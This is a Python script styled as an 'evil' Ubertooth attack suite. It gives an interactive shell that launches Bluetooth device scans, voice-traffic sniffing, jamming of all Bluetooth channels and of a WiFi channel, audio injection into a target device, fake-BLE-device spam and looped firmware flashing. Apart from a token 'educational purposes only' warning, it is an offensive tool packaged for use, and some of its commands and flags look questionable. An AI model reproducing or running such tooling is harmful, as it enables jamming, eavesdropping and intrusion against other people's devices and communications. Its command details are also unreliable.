#!/usr/bin/env python3
import os
import sys
import subprocess
import time
from datetime import datetime
import signal
import colorama
from colorama import Fore, Style
import random
import re
import readline
import threading

# Initialize colorama
colorama.init(autoreset=True)

class UberEvil:
    def __init__(self):
        self.running = True
        self.active_attacks = []
        self.attack_threads = []
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Auto-complete setup
        self.commands = ["scan", "sniff", "jam", "inject", "spoof", "destroy", "exit"]
        readline.set_completer(self.completer)
        readline.parse_and_bind("tab: complete")

    def completer(self, text, state):
        options = [cmd for cmd in self.commands if cmd.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}💀 TERMINATING ALL ATTACKS!{Style.RESET_ALL}")
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        for proc in self.active_attacks:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except:
                pass
        for thread in self.attack_threads:
            thread.join()
        os.system("pkill -f 'ubertooth|hstest|sox|btmgmt|hciconfig'")

    def show_banner(self):
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH EVIL MASTER SUITE v666
   The Ultimate Wireless Weapon
   "With great power comes great chaos"
 ------------------------------------
{Style.RESET_ALL}""")

    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Fore.RED}🚫 ERROR: This weapon requires root privileges!{Style.RESET_ALL}")
            print(f"Run: {Fore.YELLOW}sudo {sys.argv[0]} --destroy{Style.RESET_ALL}")
            sys.exit(1)

    def check_ubertooth(self):
        try:
            result = subprocess.run(["ubertooth-util", "-v"], 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE,
                                  text=True,
                                  timeout=5)
            if "Firmware version" in result.stdout:
                print(f"{Fore.GREEN}⚡ Ubertooth LOCKED & LOADED!{Style.RESET_ALL}")
                return True
            
            print(f"{Fore.RED}🚨 Ubertooth NOT RESPONDING!{Style.RESET_ALL}")
            print(f"Try: {Fore.YELLOW}ubertooth-dfu -d bluetooth_rxtx.dfu -U && ubertooth-util -v{Style.RESET_ALL}")
            return False
            
        except Exception as e:
            print(f"{Fore.RED}💀 CRITICAL: {str(e)}{Style.RESET_ALL}")
            return False

    def run_attack(self, cmd, timeout=None, bg=False):
        try:
            print(f"\n{Fore.RED}💥 LAUNCHING: {Fore.YELLOW}{cmd}{Style.RESET_ALL}")
            
            if bg:
                proc = subprocess.Popen(cmd, shell=True,
                                      stdout=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL,
                                      preexec_fn=os.setsid)
                self.active_attacks.append(proc)
                return proc
            
            proc = subprocess.Popen(cmd, shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 text=True)
            
            if timeout:
                try:
                    stdout, stderr = proc.communicate(timeout=timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    print(f"{Fore.YELLOW}⌛ Attack timed out after {timeout} seconds{Style.RESET_ALL}")
                    return False
            else:
                stdout, stderr = proc.communicate()

            if stdout: print(stdout.strip())
            if stderr: print(f"{Fore.RED}ERROR:{Style.RESET_ALL} {stderr.strip()}")
            
            return proc.returncode == 0
            
        except Exception as e:
            print(f"{Fore.RED}💣 ATTACK FAILED: {str(e)}{Style.RESET_ALL}")
            return False

    def bt_scan_devices(self):
        """Scan for vulnerable Bluetooth devices"""
        print(f"{Fore.CYAN}🔍 Scanning for Bluetooth devices...{Style.RESET_ALL}")
        self.run_attack("ubertooth-scan -t 10")

    def bt_sniff_voice(self):
        """Capture Bluetooth voice traffic"""
        print(f"{Fore.RED}🎤 BLUETOOTH VOICE SNIFFING ACTIVATED!{Style.RESET_ALL}")
        pcap = f"bt_voice_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        self.run_attack(f"ubertooth-bt -S -c {pcap}")
        print(f"{Fore.GREEN}🎧 Raw voice data saved to: {pcap}{Style.RESET_ALL}")

    def bt_jam_all(self):
        """Jam all Bluetooth channels"""
        print(f"{Fore.RED}📡 JAMMING ALL BLUETOOTH CHANNELS!{Style.RESET_ALL}")
        self.run_attack("ubertooth-jam -b -H -P 100", bg=True)

    def bt_inject_audio(self, target_bdaddr):
        """Inject audio into target device"""
        print(f"{Fore.RED}🔊 PREPARE AUDIO INJECTION ATTACK!{Style.RESET_ALL}")
        self.run_attack(
            f"bluetoothctl connect {target_bdaddr} && "
            f"sox evil.wav -t raw -r 8000 -c 1 -e signed-integer - | "
            f"hstest /dev/stdin -s 8000 -b 16 -c 1",
            bg=True
        )

    def ble_spam_devices(self, count=100):
        """Spam fake BLE devices"""
        print(f"{Fore.RED}👻 CREATING {count} FAKE BLE DEVICES!{Style.RESET_ALL}")
        self.run_attack(f"ubertooth-btle -a -A -M -n 'EVIL_DEVICE' -c {count}", bg=True)

    def wifi_jam_channel(self, channel=6):
        """Jam specific WiFi channel"""
        print(f"{Fore.RED}💣 NUKE CHANNEL {channel}!{Style.RESET_ALL}")
        self.run_attack(f"ubertooth-jam -W -c {channel}", bg=True)

    def nuclear_firmware(self):
        """Continuous firmware flashing"""
        print(f"{Fore.RED}♻️ FLASHING FIRMWARE ON LOOP!{Style.RESET_ALL}")
        self.run_attack("while true; do ubertooth-dfu -d bluetooth_rxtx.dfu -U; sleep 1; done", bg=True)

    def interactive_shell(self):
        """Main interactive shell"""
        while self.running:
            cmd = input(f"{Fore.MAGENTA}evil-ubertooth>{Style.RESET_ALL} ").strip().lower()
            
            if cmd == "scan":
                self.bt_scan_devices()
            elif cmd == "sniff":
                self.bt_sniff_voice()
            elif cmd == "jam":
                self.bt_jam_all()
            elif cmd.startswith("inject"):
                target = cmd.split()[1] if len(cmd.split()) > 1 else input("Target BDADDR: ")
                self.bt_inject_audio(target)
            elif cmd.startswith("spoof"):
                count = int(cmd.split()[1]) if len(cmd.split()) > 1 else 100
                self.ble_spam_devices(count)
            elif cmd.startswith("wifi"):
                channel = int(cmd.split()[1]) if len(cmd.split()) > 1 else 6
                self.wifi_jam_channel(channel)
            elif cmd == "destroy":
                self.nuclear_firmware()
            elif cmd == "exit":
                self.cleanup()
                self.running = False
            else:
                print(f"Available commands: {', '.join(self.commands)}")

    def main(self):
        self.check_root()
        if not self.check_ubertooth():
            sys.exit(1)
        
        self.show_banner()
        print(f"\n{Fore.YELLOW}⚠️ WARNING: This tool is for educational purposes only!{Style.RESET_ALL}")
        print(f"{Fore.RED}🚨 Misuse may violate laws and damage hardware!{Style.RESET_ALL}")
        
        try:
            self.interactive_shell()
        except Exception as e:
            print(f"\n{Fore.RED}💥 CATASTROPHIC FAILURE: {str(e)}{Style.RESET_ALL}")
            self.cleanup()

if __name__ == "__main__":
    weapon = UberEvil()
    weapon.main()
